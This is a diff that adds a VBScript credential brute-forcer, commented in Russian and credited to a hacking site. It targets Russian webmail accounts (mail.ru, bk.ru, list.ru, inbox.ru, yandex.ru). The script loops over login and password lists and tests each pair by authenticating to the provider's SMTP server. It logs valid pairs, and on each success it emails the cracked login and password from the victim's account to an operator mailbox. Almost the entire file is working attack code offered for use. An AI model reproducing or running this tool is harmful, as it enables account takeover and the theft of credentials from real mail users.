@@ -1,0 +1,220 @@
+'*********************************************
+' Брут почтовых сервисов на VBScript
+' Автор: Соколов Игорь (DomO_0)
+' Сайт: VBHack.Ru
+' Skype: domo.free
+'*********************************************
+
+Dim arrBase(), arrPass() 'объявляем два динамических массива
+Dim FSO, WShell, Base_Line, FileBase, Pass_Line, l, gg, pp, ll
+Dim i, BaseMail, PassMail, BadTxt, GoodTxt, ErrorTxt, Status
+Dim B_line, Razdel, goods, bads, errors, Time_Start, smtp
+Dim Domen, Sobaka, ll, pp, ost, Now_Timer, sr_speed, ost_time
+Dim vremenno, vrem_1, vrem_2, vrem_3, new_ost_time, Login_Pass
+
+Set FSO = CreateObject("Scripting.FileSystemObject") ' получаем доступ к объекту FileSystemObject
+Set WShell = WScript.CreateObject("WScript.Shell")'Создаем ссылку на объект WscriptShell
+
+Login_Pass = 0 'Логины и пароли хранятся в одном файле - логин;пароль, то 1. Если в разных файлах, то 0. Пароли лежат в Pass.txt.
+
+If Login_Pass = 0 Then
+	'СОЗДАЁМ МАССИВ ИЗ ЛОГИНОВ - НАЧАЛО
+	Base_Line = 0
+	Set FileBase = FSO.OpenTextFile("base.txt", 1) ' открываем файл с логинами 
+	Do Until FileBase.AtEndOfStream 'создаём массив из содержимого файла base.txt пока не наступит конец файла
+		Redim Preserve arrBase(Base_Line)  ' перезаписываем размерность массива с сохранением имеющийся информации
+		arrBase(Base_Line) = FileBase.ReadLine ' присваиваем значение элементу массива
+		Base_Line = Base_Line + 1 ' увеличиваем номер элемента массива на 1
+	Loop
+	FileBase.Close  ' закрываем файл с логинами
+	'СОЗДАЁМ МАССИВ ИЗ ЛОГИНОВ - КОНЕЦ
+ 
+	'СОЗДАЁМ МАССИВ ИЗ ПАРОЛЕЙ - НАЧАЛО
+	Pass_Line = 0
+	Set FilePass = FSO.OpenTextFile("Pass.txt", 1)
+	Do Until FilePass.AtEndOfStream
+		Redim Preserve arrPass(Pass_Line)
+		arrPass(Pass_Line) = FilePass.ReadLine
+		Pass_Line = Pass_Line + 1
+	Loop
+	FilePass.Close
+	'СОЗДАЁМ МАССИВ ИЗ ПАРОЛЕЙ - КОНЕЦ
+Else
+	'СОЗДАЁМ МАССИВЫ ИЗ ЛОГИНОВ И ПАРОЛЕЙ - НАЧАЛО
+	Base_Line = 0
+	Pass_Line = 0
+	Set FileBase = FSO.OpenTextFile("base.txt", 1) ' открываем файл с логинами 
+	Do Until FileBase.AtEndOfStream 'Выполняем цикл пока не наступит конец файла
+		Redim Preserve arrBase(Base_Line)	' перезаписываем размерность массива с сохранением имеющийся информации
+		Redim Preserve arrPass(Pass_Line)	' перезаписываем размерность массива с сохранением имеющийся информации
+		B_line = FileBase.ReadLine ' присваиваем переменной строку из файла
+		Razdel = InStr(B_line,";") ' ищем разделитель
+		If Not Razdel = 0 Then
+		arrBase(Pass_Line) = Mid(B_line,1,Razdel-1) 'Вырезаем логин из строки
+		arrPass(Base_Line) = Mid(B_line,Razdel+1) 'Вырезаем пароль из строки
+		End If
+		Base_Line = Base_Line + 1 ' увеличиваем номер элемента массива на 1
+		Pass_Line = Pass_Line + 1 ' увеличиваем номер элемента массива на 1
+	Loop
+	FileBase.Close  ' закрываем файл с логинами и паролями
+	'СОЗДАЁМ МАССИВЫ ИЗ ЛОГИНОВ И ПАРОЛЕЙ - КОНЕЦ
+End If
+li = 0
+goods = 0
+bads = 0
+errors = 0
+Time_Start = Timer ' Записываем время начала брута
+
+For l = Lbound(arrBase) to UBound(arrBase) Step 1 ' Запускаем цикл for ... next от нижней границы массива логинов до верхней с шагом 1
+    BaseMail = arrBase(l) ' присваиваем переменный логин из массива
+	If Not Login_Pass = 0 Then PassMail = arrPass(l) ' присваиваем переменной пароль из массива
+	
+	'ОПРЕДЕЛЯЕМ ДОМЕН ПОЧТЫ И КАКОЙ НАДО SMTP СЕРВЕР - НАЧАЛО
+	If InStr(BaseMail,"@mail.ru") > 0 then
+		smtp = "mail"
+	Elseif InStr(BaseMail,"@bk.ru") > 0 then
+		smtp = "bk"
+	Elseif InStr(BaseMail,"@list.ru") > 0 then
+		smtp = "list"
+	Elseif InStr(BaseMail,"@inbox.ru") > 0 then
+		smtp = "inbox"
+	ElseIf InStr(BaseMail,"@yandex.ru") > 0 then
+		smtp = "yandex"
+	else
+		smtp = ""
+	End If
+	'ОПРЕДЕЛЯЕМ ДОМЕН ПОЧТЫ И КАКОЙ НАДО SMTP СЕРВЕР - КОНЕЦ
+	
+	If Not smtp = "" Then
+		Domen = "@" & smtp & ".ru"
+		Sobaka = InStr(BaseMail,Domen) - 1
+		BaseMail = Mid(BaseMail,1,Sobaka) 'Получаем логин без домена
+	End If
+
+	If Login_Pass = 0 then ' если пароли лежат отдельно в Pass.txt
+		For i = Lbound(arrPass) to UBound(arrPass)
+			PassMail = arrPass(i)
+			sub_brute BaseMail,PassMail,smtp ' вызываем процедуру sub_brute
+			If Not li = 1 then WShell.Run("status.vbs")' запуск статистики
+			li=1
+		Next
+	Else ' если пароли лежат вместе с логинами.
+		sub_brute BaseMail,PassMail,smtp' вызываем процедуру sub_brute
+		If Not li = 1 then WShell.Run("status.vbs")' запуск статистики
+		li=1
+	End If
+	
+Next ' конец массива перебора логинов
+
+Function sub_brute(BaseMail,PassMail,smtp)
+	On Error Resume Next  ' пропуск ошибок для их обработки
+	Set objMsg = CreateObject("CDO.Message") 
+	Set Config = CreateObject("CDO.Configuration") 
+	Set Config = objMsg.Configuration 
+	objMsg.Subject = "Пароль подобран!" ' тема письма которой придёт Вам при подборе пароля
+	objMsg.Textbody = "Удача! Спасибо VBHack.Ru ! Логин: "&BaseMail&"@mail.ru Пароль: "&PassMail&""  ' текст письма который придёт Вам при подборе пароля
+	objMsg.To = "login@mail.ru"  ' ваша действующая почта
+	objMsg.From = ""&BaseMail&"@" & smtp & ".ru"  ' вставляем логин и домен жертвы.
+	Config("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2 ' использовать smtp
+	Config("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True  ' защещённое подключение ssl
+	Config("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp." & smtp & ".ru"  ' smtp сервер. Меняется в зависимости от почтового сервиса
+	Config("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465  ' smtp порт
+	Config("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  ' требуется авторизация
+	Config("http://schemas.microsoft.com/cdo/configuration/sendusername") = ""&BaseMail&""  '  вставляем логин жертвы
+	Config("http://schemas.microsoft.com/cdo/configuration/sendpassword") = ""&PassMail&""  ' вставляем пароли
+	Config.Fields.Update ' обновляем инфу с конфигов
+	objMsg.Send ' пытаемся отправить письмо
+ 
+	' начинаем сортировать ошибки
+	if Err.Number=-2147220975 then  ' если пароль или логин не подошёл
+		Set BadTxt = FSO.CreateTextFile("bad.txt", True) ' создаём текстовый документ с возможностью добавления записей
+		BadTxt.WriteLine (""&BaseMail&"@" & smtp & ".ru;"&PassMail&"") ' добавляем в него новую строку
+		Bads = Bads + 1
+	elseif Err.Number=0 then ' логин и пароль подошли
+		Set GoodTxt = FSO.CreateTextFile("good.txt", True)
+		GoodTxt.WriteLine (""&BaseMail&"@" & smtp & ".ru;"&PassMail&"") 
+		Goods = Goods + 1
+	elseif Err.Number<>-2147220975 and smtp = "" then ' если не правильная почта
+		Set ErrorTxt = FSO.CreateTextFile("Error.txt", True)
+		ErrorTxt.WriteLine (""&BaseMail&":"&PassMail&"")
+		Errors = Errors + 1
+	elseif Err.Number<>-2147220975 then ' если возникла неизвестная ошибка
+		Set ErrorTxt = FSO.CreateTextFile("Error.txt", True)
+		ErrorTxt.WriteLine (""&BaseMail&"@" & smtp & ".ru;"&PassMail&"")
+		Errors = Errors + 1
+	end if
+
+	
+	If Login_Pass = 1 then
+		ll = l+1 'сколько комбинаций проверено
+		pp = UBound(arrBase) +1 ' сколько их всего
+	Else
+		ll = goods+bads+errors
+		pp = UBound(arrBase) +1
+		gg = UBound(arrPass) +1
+		pp = pp * gg
+	End If
+	
+	ost = pp - ll 'осталось проверить
+	Now_Timer = Timer - Time_Start 'сколько секунд прошло
+	sr_speed = Now_Timer / ll 'сколько секунд потребовалось на одну комбинацию
+	ost_time = int(ost * sr_speed)' сколько секунд осталось. Целое число
+		
+	if ost_time >= 3600 then  ' если осталось больше 3600 сек.
+		vremenno = Round(ost_time / 3600, 2) ' делим на 3600 и получаем число с двумя знаками после запятой
+		vrem_1 = ""& vremenno &""  ' вставляем число в строку
+		vrem_2 = int(vremenno) ' получаем целое число
+		vrem_3 = Len(vrem_2)  ' узнаём из скольки символов состоит целое число
+		vrem_4 = Mid(vrem_1,vrem_3+2,2)  ' из числа убираем целую часть и запятую
+		If vrem_4 > 59 Then 
+			vremenno = vrem_4 \ 60
+			vremenno = int(vremenno)
+			vrem_2 = vrem_2 + vremenno
+			vremenno = vremenno * 60
+			vrem_4 = vrem_4 + vremenno
+		End If
+		if IsNumeric(vrem_4) and Len(vrem_4) = 2 then  ' если то что осталось является двухзначным числом
+			new_ost_time = vrem_2 & " Час. " & vrem_4 &  " Мин."  '  выводим получинную информацию
+		elseif IsNumeric(vrem_4) and Len(vrem_4) = 1 then  ' если то что осталось является натуральным числом
+			new_ost_time = vrem_2 & " Час. " & vrem_4 &  "0 Мин."  '  выводим получинную информацию
+		else
+			new_ost_time = vrem_2 & " Час."  ' если минут нет
+		end if
+	elseif ost_time >= 60 and ost_time < 3600 then  ' если осталось больше 60 сек или столько и меньше 3600 сек
+		vremenno = Round(ost_time / 60, 2)
+		vrem_1 = ""& vremenno &""
+		vrem_2 = int(vremenno)
+		vrem_3 = Len(vrem_2)
+		vrem_4 = Mid(vrem_1,vrem_3+2,2)
+		If vrem_4 > 59 Then 
+			vremenno = vrem_4 \ 60
+			vremenno = int(vremenno)
+			vrem_2 = vrem_2 + vremenno
+			vremenno = vremenno * 60
+			vrem_4 = vrem_4 + vremenno
+		End If
+		if IsNumeric(vrem_4) and Len(vrem_4) = 2 then
+			new_ost_time = vrem_2 & " Мин. " & vrem_4 &  " Сек."
+		elseif IsNumeric(vrem_4) and Len(vrem_4) = 1 then  ' 
+			new_ost_time = vrem_2 & " Мин. " & vrem_4 &  "0 Сек."
+		else
+			new_ost_time = vrem_2  & " Мин."
+		end if
+	elseif ost_time < 60  and ost_time > 0 then  ' если осталось меньше 60 сек и больше 0
+		new_ost_time = ost_time & " Сек."
+	else
+		new_ost_time = "Неизвестно"  ' если не подходит ни один вариант
+	end if
+		
+	Set Status = FSO.CreateTextFile("Status.txt", True) 'создаём файл со статистикой
+	Status.Write ("Всего: "& pp & vbCrlf & "Проверено: " & ll & vbCrlf & "Осталось: " & ost & vbCrlf & "Хороших: " & Goods & vbCrlf & "Плохих: " & Bads & vbCrlf & "Ошибок: " & Errors & vbCrlf & "Осталось времени: " & new_ost_time)
+	Status.Close
+
+	iF l = Ubound(arrBase) and i = Ubound(arrPass) then
+		GoodTxt.Close ' закрываем гуды
+		BadTxt.Close ' закрываем бэды
+		ErrorTxt.Close ' закрываем ошибки
+	End if
+End Function
+
+MsgBox "Подбор паролей закончен! Проверьте результаты!"
